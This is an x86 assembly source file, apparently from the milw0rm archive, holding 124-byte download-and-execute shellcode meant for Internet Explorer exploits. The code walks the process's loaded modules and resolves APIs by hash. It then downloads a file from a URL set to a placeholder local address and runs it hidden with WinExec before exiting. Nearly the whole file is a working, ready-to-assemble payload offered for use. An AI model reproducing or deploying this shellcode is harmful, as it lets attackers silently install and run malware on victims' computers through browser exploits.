;
; relocateable dynamic runtime assembly code example using hash lookup *** for IE exploits only ***
; the URLMON.DLL must already be loaded into the process space for this to work, so do not run on its own!!
;
; to test use /DTEST_CODE in ml command line
;
; URLDownLoadToFileA() / WinExec() / ExitProcess() | ExitThread()
;
; 124 bytes
;
; for testing:
;
; ml /c /coff /Cp /DTEST_CODE dexec32.asm
; link /subsystem:windows /section:.text,w dexec32.obj urlmon.lib
;
; wyse101 [at] gmail.com
;
; March 2007
;
      .386
      .model flat,stdcall

      ROL_CONSTANT equ 5

      mrol macro iNum:req,iBits:req
           exitm <(iNum shl iBits) or (iNum shr (32-iBits))>
      endm

      mror macro iNum:req,iBits:req
           exitm <(iNum shr iBits) or (iNum shl (32-iBits))>
      endm

      hashapi macro szApi
              local dwApi

              dwApi = 0

              forc x,szApi
                   dwApi = dwApi + '&x'
                   dwApi = mrol(dwApi,ROL_CONSTANT)
              endm
              dwApi = mrol(dwApi,ROL_CONSTANT)
              dw (dwApi and 0ffffh)
      endm

      .code

      assume fs:nothing

code_start:
      jmp load_data
IFDEF TEST_CODE
extern URLDownloadToFileA   :proc
      call URLDownloadToFileA                     ; included when assembled with /DTEST_CODE
ENDIF
setup_parameters:
      pop edi                                     ; offset @cmd_start
      xor eax,eax                                 ; eax = 0
      cdq                                         ; edx = 0
      ; ********************************************************************
      push eax                                    ; exit code  = 0
      ; ********************************************************************
      push eax                                    ; SW_HIDE
      mov dl,(@cmd_end-@cmd_start)-1              ; this allows command up to 255 bytes
      push edi                                    ; file name to execute
      ; ********************************************************************
      push eax                                    ; callback routine URLDownLoadToFileA
      push eax                                    ; reserved, must be zero
      push edi                                    ; file name to save as
      add edi,edx                                 ; get offset of @url_start-1
      stosb                                       ; zero tail end
      mov dl,(@url_end-@url_start)-1              ; limit of 255 bytes for url
      push edi                                    ; url to download file from
      push eax                                    ; interface
      add edi,edx                                 ; get offset of @urlmon-1
      stosb                                       ; zero tail end of url
      ; *********************************************************************
load_modules:
      push edi                   ; save current offset to hashes
      push 30h
      pop ecx
      mov eax,fs:[ecx]           ; PEB base address
      mov eax,[eax+0ch]          ; PEB_LDR_DATA LoaderData
      mov ebp,[eax+1ch]          ; LIST_ENTRY InMemoryOrderModuleList
scan_dll:
      mov ebx,[ebp+8]            ; DllBase
      mov ebp,[ebp]              ; Flink
      push ebp                   ; save

      mov eax,[ebx+3ch]
      mov eax,[ebx+eax+78h]	 ; IMAGE_DIRECTORY_ENTRY_EXPORT
      lea esi,[ebx+eax+18h]	 ; offset IMAGE_EXPORT_DIRECTORY.NumberOfNames
      lodsd
      xchg eax,ecx               ; ecx = NumberOfNames

      lodsd
      add eax,ebx                ; AddressOfFunctions
      push eax

      lodsd
      lea edi,[eax+ebx]          ; AddressOfNames

      lodsd
      lea ebp,[eax+ebx]		 ; ebp = AddressOfNameOrdinals
load_api:
      mov esi,[edi+4*ecx-4]
      add esi,ebx
      xor eax,eax
      cdq
hash_api:
      lodsb
      add edx,eax
      rol edx,ROL_CONSTANT
      dec eax
      jns hash_api

      mov esi,[esp+8]                             ; get api hashes
      cmp dx,word ptr[esi]                        ; found a match?
      je call_api

      loop load_api
      pop eax                                     ; check
      pop ebp                                     ;
      jmp scan_dll
call_api:
      pop eax
      movzx edx,word ptr [ebp+2*ecx-2]
      add ebx,[eax+4*edx]
      pop ebp                                     ; modules
      pop edi                                     ; api hashes
      call ebx                                    ; call api
      stosw                                       ; advance 2 bytes to next hash
      jmp load_modules                             ; do another, just keep going until ExitProcess is reached.
      ; *************************
load_data:
      call setup_parameters
@cmd_start:
      db 'file.exe',0ffh                          ; WinExec("file.exe",SW_HIDE);
@cmd_end:
@url_start:
      db 'http://127.0.0.1/file.exe',0ffh         ; url of file to download
@url_end:
      hashapi <URLDownloadToFileA>
      hashapi <WinExec>
      hashapi <ExitProcess>
      ; *********************************************************************

end code_start

; milw0rm.com [2007-06-14]